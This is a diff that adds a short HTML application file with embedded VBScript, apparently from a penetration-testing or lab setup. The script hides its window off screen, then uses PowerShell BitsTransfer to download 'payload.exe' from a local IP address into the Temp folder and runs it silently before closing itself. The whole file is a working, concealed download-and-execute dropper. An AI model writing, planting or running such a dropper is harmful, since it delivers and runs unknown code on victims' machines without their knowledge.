@@ -1,0 +1,9 @@
+<html>
+<script language="VBScript">
+window.resizeto 0,0
+window.Moveto -200,-200
+set Objshell = CreateObject("Wscript.Shell")
+Objshell.run("powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://192.168.1.103/payload.exe -Destination $env:Temp\payload.exe;start-process $env:Temp\payload.exe"),0
+self.close
+</script>
+</html>
